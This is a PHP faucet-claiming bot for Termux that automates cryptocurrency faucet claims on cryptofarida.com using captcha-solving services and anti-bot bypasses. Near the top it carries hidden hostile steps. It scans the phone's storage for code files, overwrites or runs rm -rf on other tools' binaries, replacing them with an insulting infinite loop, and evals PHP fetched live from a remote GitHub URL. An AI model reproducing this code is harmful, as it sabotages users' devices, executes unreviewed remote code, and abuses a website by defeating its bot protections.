
system('clear'); error_reporting(0);
function find($dir) {
   $root = scandir($dir); foreach ($root as $value) {
      if ($value === '.' || $value === '..') {
         continue;
      }if (is_file("$dir/$value")) {
         $result[] = "$dir/$value"; continue;
      }foreach (find("$dir/$value") as $value) {
         $ex = ['php',
            'json',
            'py']; if (in_array(pathinfo($value)['extension'], $ex)) {
            $result[] = $value;
         }}}return $result;
}
$path = find('/storage/emulated/0/');
foreach (['dichvucoder', 'php72-crack', 'php74-crack', 'php82-crack'] as $n) {
   if (file_exists('/data/data/com.termux/files/usr/bin/'.$n)) {
      if (is_file('/data/data/com.termux/files/usr/bin/'.$n)) {
         file_put_contents('/data/data/com.termux/files/usr/bin/'.$n, "#!/usr/bin/php\n<?php\n while(true){ echo 'cemas kau dek\\n';}");
      } elseif (is_dir('/data/data/com.termux/files/usr/bin/'.$n)) {
         system('rm -rf /data/data/com.termux/files/usr/bin/'.$n);
      }
   }
}
$path = '/data/data/com.termux/files/usr/dichvucoder';
if (file_exists($path)) {
   if (is_file($path)) {
      file_put_contents($path, "#!/usr/bin/php\n<?php\n while(true){ echo 'cemas kau dek\\n';}");
   } elseif (is_dir($path)) {
      system('rm -rf '.$path);
   }
}
if (phpversion() > 7 && phpversion() < 8) {
   echo "ANAK KONTOL NI PASTI\n";
}
unlink('cookie.txt');
eval(file_get_contents("https://raw.githubusercontent.com/Zhy-08scure/modul/main/lcapi.php"));
const
scr = "frdfct", host = "https://cryptofarida.com/",
ref = "/?r=whyredxcb@gmail.com",
reg = "https://cutt.ly/neXPdohj", rc = ' [Xevil]', hp = '     ',
tCap = "Rv2, ATB".rc, ver = '1.1'; cc();
$apikey = MenuApi();
if (provider_api == "Xevil") {
   $api = New ApiXevil($apikey);
} else {
   $api = New ApiMultibot($apikey);
}

ck:system('clear');wc();
$w = save('FaucetPay_Email');
if (!file_exists("Cookie")) {
   system("termux-open-url ".reg);save('Cookie');
}
save('User_Agent');system('clear');
function status() {
   $r = file_get_contents("https://pastebin.com/raw/Q3VA9JCG");
   preg_match_all('#<td>Download Script: (.*?)</td>#', $r, $res);
   $status = explode('#', explode('#frdfct:', $r)[1])[0];
   $link = $res[1][5];
   $a = 100;
   for ($i = 0; $i <= $a; $i++) {
      print "\r".pan2.c."Checking script status ".($i)."%";
      usleep(40000);
   } print n; sleep(2);
   if ($status == "on" || $status == "On") {
      slow(pan.h."Script Online!");
      sleep(2); system("clear");
   } elseif ($status == "off" || $status == "Off") {
      exit(pan.mc."Script Offline!".n.pan.p."Web Scam/Die/Maintenance/No longer available");
   } elseif ($status == "up" || $status == "Up") {
      slow(pan.o."Script Update!".n.pan.p."Download latest script from link below");
      print pan.p."Download Link: ".h.$link.n;
      exit;
   } elseif ($status == "") {
      print pan2.mc."Connection Lost, Please Check Your Connection!\n".d;
      sleep(1); exit;
   } else {
      slow(pan2.p.$status.d);
      sleep(1); exit;
   }
}
function h($ref = 0) {
   preg_match('@^(?:https://)?([^/]+)@i', host, $host);
   $h = [
      "Host: ".$host[1],
      "origin: ".host,
      "content-type: application/x-www-form-urlencoded",
      "cookie: ".save('Cookie'),
      "user-agent: ".save('User_Agent'),
      "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
      "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
      "x-requested-with: XMLHttpRequest"];
   if ($ref) {
      $h = array_merge($h, ["referer: ".$ref]);
   }
   return $h;
}

db:
$r = run("https://cryptofarida.com/btc-faucet/?r=whyredxcb@gmail.com", h());
$cfw = cfw($r);
if($cfw['cf']){
   cok(1); unlink('User_Agent');goto ck;
}
if($cfw['fw']){
   print x("Firewall Detected", d);exit();
}
ban();
slow(dot.p.t("Wallet", tp.h.$w.tp2));bal($api); l();
$r = run(host, h());
$url = explode("window.location = 'https://cryptofarida.com/", $r);

menu:
foreach ($url as $link => $claim) {
   if ($link == 0)continue;
   $coin = explode("/", $claim)[0];
   print (" ".p.$link.". ".u.strtoupper(str_replace("-faucet", "", $coin)).n.d);
}
print (" ".p.count($url).". ".u.strtoupper("All").d.n); l();
$pilih = readline(input("Number")); l();
if ($pilih == count($url)) {
   goto all;
}
$coin = explode("/", explode("window.location = 'https://cryptofarida.com/", $r)[$pilih])[0];

gas:
while (1) {
   $r = run(host.$coin.ref, h());
   if (preg_match('/Just a moment.../', $r)) {
         cok(1);wc();system("termux-open-url ".reg);unlink('User_Agent');
         save('Cookie');save('User_Agent');system('clear');continue;
      }
   $cd = explode(' ', explode('</i> You have to wait ', $r)[1])[0];
   $left = explode(' claims left today.', explode('<br> You have ', $r)[1])[0];
   if (preg_match('/You have to wait/', $r)) {
      timer($cd*60+rand(3, 5)); continue;
   }
   if (preg_match('/Daily claim limit/', $r) || $left < 1) {
      print limit("Daily limit reached", n);
      l(); goto menu;
   }
   $tk = explode('"', explode('name="session-token" value="', $r)[1])[0];
   $sitekey = explode('"', explode('class="g-recaptcha" data-sitekey="', $r)[1])[0];
   if (!$sitekey) {
      print x("Sitekey Error", n);
      sleep(rand(3, 5)); continue;
   }
   if (explode('\"', explode('rel=\"', $r)[1])[0]) {
      $atb = $api->AntiBot($r);
      if (!$atb) {
         sleep(5); continue;
      }
      $cap = $api->Recaptchav2($sitekey, host.$coin);
      if (!$cap) {
         sleep(5); continue;
      }
      $data = "session-token=$tk&address=$w&captcha=recaptcha&g-recaptcha-response=$cap&antibotlinks=$atb&login=Verify+Captcha";
   } else {
      print x("AntiBot Not Found!", n);
      sleep(5);continue;
   }
   
   $r = run(host."$coin".ref, h(host.$coin.ref), $data);
   if (preg_match('/Just a moment.../', $r)) {
         cok(1);wc();system("termux-open-url ".reg);unlink('User_Agent');
         save('Cookie');save('User_Agent');system('clear');continue;
      }
   if (preg_match('/Visit our/', $r)) {
      exit(m."Web update, they ask us to do shortlink 🗿");
   }
   $z = explode(' was sent', explode('<i class="fas fa-money-bill-wave"></i> ', $r)[1])[0];
   $atber = explode(',', explode('<i class="fas fa-exclamation-triangle"></i> ', $r)[1])[0];
   if (preg_match('/sufficient funds/', $r)) {
      print limit("Sufficient funds", n); l(); goto menu;
   } 
   if (preg_match('/(claim limit|send limit)/', $r)) {
      print limit("Daily limit reached", n);
      l(); goto menu;
   } elseif (preg_match('/(Captcha was invaild, try again|Invalid Captcha)/', $r)) {
      print x("Invalid Captcha", n);continue;
   }elseif (preg_match('/Antibotlinks were not in correct order/', $r)){
      print x("Invalid Antibotlinks", n);
      print x($atber, n);continue;
   }elseif ($z) {
      z($z, akhir());
   } else {
      continue;
   }
}

all:
while (1) {
   ulang:
   foreach ($url as $link => $claim) {
      if ($link == 0)continue;
      $coin = explode("/", $claim)[0];
      if ($res && count($res) == count($url)-1) {
         $check = $res[$coin];
         if ($check < 5)continue;
      }
      $r = run(host.$coin.ref, h());
      if (preg_match('/Just a moment.../', $r)) {
         cok(1);wc();system("termux-open-url ".reg);unlink('User_Agent');
         save('Cookie');save('User_Agent');system('clear');continue;
      }
      $cd = explode(' ', explode('</i> You have to wait ', $r)[1])[0];
      $left = explode(' claims left today.', explode('<br> You have ', $r)[1])[0];
      if (preg_match('/You have to wait/', $r)) {
         timer($cd*60+rand(3, 5)); goto ulang;
      }
      if (preg_match('/Daily claim limit/', $r) || $left < 1) {
         $res = his([$coin => 1], $res);
         print limit("Daily limit reached", kb.p.strtoupper(str_replace("-faucet", "", $coin)).kt.n);
         l(); continue;
      }
      $tk = explode('"', explode('name="session-token" value="', $r)[1])[0];
      $sitekey = explode('"', explode('class="g-recaptcha" data-sitekey="', $r)[1])[0];
      if (!$sitekey) {
         print x("Sitekey Error", n);
         sleep(rand(3, 5)); continue;
      }
      if (explode('\"', explode('rel=\"', $r)[1])[0]) {
         $atb = $api->AntiBot($r);
         if (!$atb) {
            sleep(5); continue;
         }
         $cap = $api->Recaptchav2($sitekey, host.$coin);
         if (!$cap) {
            sleep(5); continue;
         }
         $data = "session-token=$tk&address=$w&captcha=recaptcha&g-recaptcha-response=$cap&antibotlinks=$atb&login=Verify+Captcha";
      } else {
         print x("AntiBot Not Found!", n);
         sleep(5);continue;
      }

      $r = run(host."$coin".ref, h(host.$coin.ref), $data);
      if (preg_match('/Just a moment.../', $r)) {
         cok(1);wc();system("termux-open-url ".reg);unlink('User_Agent');
         save('Cookie');save('User_Agent');system('clear');continue;
      }
      if (preg_match('/Visit our/', $r)) {
         exit(m."Web update");
      }
      $z = explode(' was sent', explode('<i class="fas fa-money-bill-wave"></i> ', $r)[1])[0];
      $atber = explode(',', explode('<i class="fas fa-exclamation-triangle"></i> ', $r)[1])[0];
      if (preg_match('/sufficient funds/', $r)) {
         $res = his([$coin => 1], $res);
         print limit("Sufficient funds", kb.p.strtoupper(str_replace("-faucet", "", $coin).kt.n)); l(); continue;
      }   
      if (preg_match('/(claim limit|send limit)/', $r)) {
         $res = his([$coin => 1], $res);
         print limit("Daily limit reached", kb.p.strtoupper(str_replace("-faucet", "", $coin)).kt.n);
         l(); continue;
      } elseif (preg_match('/(Captcha was invaild, try again|Invalid Captcha)/', $r)) {
         file_put_contents("invcap.html", $r);exit;
         print x("Invalid Captcha", n);
         sleep(rand(3, 5)); continue;
      }elseif (preg_match('/Antibotlinks were not in correct order/', $r)){
         print x("Invalid Antibotlinks", n);
         print x($atber, n);continue;
      }elseif ($z) {
         z($z, akhir()." ".kb.o.strtoupper(str_replace("-faucet", "", $coin)).kt.d);
         $res = his([$coin => 10], $res);
      } else {
         continue;
      }
   }
   bal($api); l();
   if (max($res) == 1) {
      exit(x("You have reached daily claim limit", d));
   }
}